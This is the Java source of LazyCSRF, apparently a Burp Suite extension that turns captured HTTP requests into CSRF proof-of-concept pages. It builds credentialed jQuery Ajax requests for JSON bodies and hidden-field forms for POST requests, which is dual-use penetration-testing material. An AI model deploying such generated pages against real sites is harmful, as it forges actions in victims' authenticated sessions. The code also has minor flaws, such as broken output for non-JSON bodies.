package burp;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.PrintWriter;
import java.io.UnsupportedEncodingException;
import java.util.ArrayList;
import java.util.List;

public class BurpExtender implements IBurpExtender, IContextMenuFactory
{

    private IContextMenuInvocation menuInvocation;
    private IBurpExtenderCallbacks burpCallbacks;
    private PrintWriter stdout;
    private IExtensionHelpers iexHelpers;

    private static String EXTENSION_NAME = "LazyCSRF";
    private static String JSON_CSRF_MENU_NAME = "Generate JSON CSRF PoC with Ajax";
    private static String PUT_DELETE_CSRF_MENU_NAME = "Generate DELETE/PUT CSRF PoC with Ajax";
    private static String FORM_CSRF_MENU_NAME = "Generate POST CSRF PoC with Form";
    private static String NEW_LINE = System.lineSeparator();

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks)
    {
        this.burpCallbacks = callbacks;
        this.burpCallbacks.setExtensionName(EXTENSION_NAME);
        this.burpCallbacks.registerContextMenuFactory(this);
        this.iexHelpers = this.burpCallbacks.getHelpers();

        stdout = new PrintWriter(this.burpCallbacks.getStdout(), true);
        stdout.println("INFO: Hello from LazyCSRF");
    }
    
    @Override
    public List<JMenuItem> createMenuItems(IContextMenuInvocation invocation)
    {
        List<JMenuItem> menuList = new ArrayList<>();
        menuInvocation = invocation;
        if(menuInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_PROXY_HISTORY ||
                menuInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_MESSAGE_VIEWER_REQUEST ||
                menuInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_MESSAGE_VIEWER_RESPONSE ||
                menuInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_MESSAGE_EDITOR_REQUEST ||
                menuInvocation.getInvocationContext() == IContextMenuInvocation.CONTEXT_MESSAGE_EDITOR_RESPONSE
        ) {
            JMenuItem GenerateJsonPocButton = new JMenuItem(JSON_CSRF_MENU_NAME);
            GenerateJsonPocButton.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent arg0) {
                    if(arg0.getActionCommand().equals(JSON_CSRF_MENU_NAME)) {
                        IHttpRequestResponse[] selectedMessages = menuInvocation.getSelectedMessages();
                        for (IHttpRequestResponse req : selectedMessages) {
                            IRequestInfo reqInfo = iexHelpers.analyzeRequest(req);
                            CSRFPoCWindow view = new CSRFPoCWindow(EXTENSION_NAME);
                            view.setVisible();
                            String pocText = GenerateJSONPoC(req, reqInfo);
                            view.setRequestLabel(reqInfo.getUrl().toString());
                            view.setCSRFPoCHTML(pocText);
                            String reqFullText = new StringBuilder()
                                    .append(parseHeaderText(reqInfo.getHeaders()))
                                    .append(parseBodyText(req.getRequest()))
                                    .toString();
                            view.setRequest(reqFullText);
                        }
                   }
               }
            });
            menuList.add(GenerateJsonPocButton);

            JMenuItem GenerateFormPocButton = new JMenuItem(FORM_CSRF_MENU_NAME);
            GenerateFormPocButton.addActionListener(new ActionListener() {
                @Override
                public void actionPerformed(ActionEvent arg0) {
                    if(arg0.getActionCommand().equals(FORM_CSRF_MENU_NAME)) {
                        IHttpRequestResponse[] selectedMessages = menuInvocation.getSelectedMessages();
                        for (IHttpRequestResponse req : selectedMessages) {
                            IRequestInfo reqInfo = iexHelpers.analyzeRequest(req);
                            CSRFPoCWindow view = new CSRFPoCWindow(EXTENSION_NAME);
                            view.setVisible();
                            String pocText = GenerateFormPoC(reqInfo);
                            view.setRequestLabel(reqInfo.getUrl().toString());
                            view.setCSRFPoCHTML(pocText);
                            String reqFullText = new StringBuilder()
                                    .append(parseHeaderText(reqInfo.getHeaders()))
                                    .append(parseBodyText(req.getRequest()))
                                    .toString();
                            view.setRequest(reqFullText);
                        }
                    }
                }
            });
            menuList.add(GenerateFormPocButton);
        }
        return menuList;
    }
    
    private String GenerateJSONPoC(IHttpRequestResponse req, IRequestInfo reqInfo)
    {
        String method = reqInfo.getMethod();
        String body = this.iexHelpers.bytesToString(req.getRequest()).substring(reqInfo.getBodyOffset());
        String url = reqInfo.getUrl().toString();

        StringBuilder PoCBuilder = new StringBuilder()
                .append("<!DOCTYPE html>\n")
                .append("<html>\n")
                .append("<body>\n")
                .append("<script src=\"https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js\"></script>\n")
                .append("<script>\n")
                .append("$.ajax({\n")
                .append("  url: '").append(url).append("',\n")
                .append("  type: '").append(method).append("',\n")
                .append("  contentType: 'application/json; charset=utf-8',\n")
                .append("  xhrFields: {\n")
                .append("    withCredentials: true\n")
                .append("  },\n")
                .append("  crossDomain: true,\n");

        if (isJSON(body)) {
            PoCBuilder.append("  contentType: 'application/json; charset=utf-8',\n")
                    .append("  data: '").append(escapeParam(body));
        }
        PoCBuilder.append("',\n")
                .append("  success: function (result) {\n")
                .append("    console.log(result);\n")
                .append("  },\n")
                .append("  error: function(result) {\n")
                .append("    console.log(result);\n")
                .append("  }\n")
                .append("});\n")
                .append("</script>\n")
                .append("</body>\n")
                .append("</html>\n");

        return PoCBuilder.toString();
    }

    private String GenerateFormPoC(IRequestInfo reqInfo)
    {
        String method = reqInfo.getMethod();
        String url = reqInfo.getUrl().toString();

        StringBuilder PoCBuilder = new StringBuilder()
                .append("<html>\n")
                .append("<body>\n")
                .append("<form method=\"").append(method).append("\" action=\"").append(url).append("\">\n");

        List<IParameter> params = reqInfo.getParameters();

        params.forEach((param) -> {
            if (param.getType() == 1) {
                PoCBuilder.append("  <input type=\"hidden\" name=\"")
                        .append(encodeHTML(iexHelpers.urlDecode(param.getName())))
                        .append("\" value=\"").append(encodeHTML(iexHelpers.urlDecode(param.getValue()))).append("\">\n");
            }
        });

        PoCBuilder.append("  <input type=\"submit\" value=\"Submit request\">\n")
                .append("</form>\n")
                .append("</body>\n")
                .append("</html>");

        return PoCBuilder.toString();
    }

    private boolean isJSON(String json) {
        // org.json.JSON does not work well on burp...
        if (json.startsWith("{") && json.endsWith("}")) {
            return true;
        }
        return false;
    }

    private String parseHeaderText(List<String> headers) {
        StringBuilder stringBuilder = new StringBuilder();
        for (String header : headers) {
            stringBuilder.append(header)
                    .append(NEW_LINE);
        }
        return stringBuilder.toString();
    }

    private String parseBodyText(byte[] bodyBytes) {
        String req = "";
        try {
            req = new String(bodyBytes, "UTF-8");
            req = req.substring(this.iexHelpers.analyzeResponse(bodyBytes).getBodyOffset());
        } catch (UnsupportedEncodingException e) {
            System.out.println("Error converting string");
        }

        if (req.length() > 0) {
            req = NEW_LINE + req;
            return req;
        } else {
            return "";
        }
    }

    private String escapeParam(String escape) {
        return escape.replace("\\", "\\\\")
                .replace("'", "\\'");
    }

    public static String encodeHTML(String encode){
        return encode.replace("\"", "&quot;");
    }

}
